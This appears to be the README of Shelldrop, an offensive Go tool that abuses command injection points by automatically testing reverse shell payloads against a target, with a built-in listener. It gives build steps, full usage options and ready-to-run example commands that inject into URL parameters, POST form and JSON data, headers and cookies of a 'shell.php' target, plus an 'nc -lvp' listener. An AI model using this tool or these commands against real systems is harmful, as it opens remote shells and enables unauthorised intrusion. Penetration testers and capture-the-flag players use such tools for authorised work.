# Shelldrop

A command injection tool that leverages an injection point by automatically testing for working reverse shell payloads.

Shelldrop works by injecting payloads into the provided `SHELLDROP` keyword/placeholder.

**Features:**

- Configurable injection point
- Automatic payload detection
- Built-in listener
- Flexible configuration

![til](./demo/demo.gif)

## Build

```bash
git clone https://github.com/shhrew/shelldrop
cd shelldrop
go build -o shelldrop
```

## Usage

```text
usage: shelldrop [-h|--help] -l|--lhost "<value>" -p|--lport <integer>
                 [-P|--payload "<value>"] -u|--url "<value>" [-X|--method
                 (GET|POST|PUT|PATCH|DELETE)] [-d|--data "<value>"]
                 [-H|--header "<value>" [-H|--header "<value>" ...]]
                 [-C|--cookie "<value>" [-C|--cookie "<value>" ...]]
                 [--no-listener] [--no-color]

                 A command injection tool that automatically tests for working
                 reverse shell payloads.

[*] = Asterisked arguments can contain the SHELLDROP injection keyword

Arguments:

  -h  --help         Print help information
  -l  --lhost        The listen address
  -p  --lport        The listen port
  -P  --payload      Specific payload to use
  -u  --url          The target url [*]
  -X  --method       The request method. Default: GET
  -d  --data         POST data [*]
  -H  --header       Header "Name: Value" pairs, can be used multiple times [*]
  -C  --cookie       Cookie "Name=Value" pairs, can be used multiple times [*]
      --no-listener  Disable the built-in listener
      --no-color     Disable color output
```

## Examples

#### URL Injection
```bash
shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php?cmd=SHELLDROP"
```

#### Using Specific Payload
```bash
shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php?cmd=SHELLDROP" -P bash_tcp_1
```

#### Post Data Injection
```bash
# Form data
shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php" -X POST -d "vuln_param=SHELLDROP"

# JSON data
shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php" -X POST -d '{"vuln_param": "SHELLDROP"}' -H "Content-Type: application/json"
```

#### Header Injection
```bash
shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php" -H "User-Agent: SHELLDROP"
```

#### Cookie Injection
```bash
shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php" -C "vuln_cookie=SHELLDROP"
```

#### Using External Listener
```bash
# Start your own listener first
nc -lvp 4444

# Run shelldrop with built-in listener disabled
shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php?cmd=SHELLDROP" --no-listener
```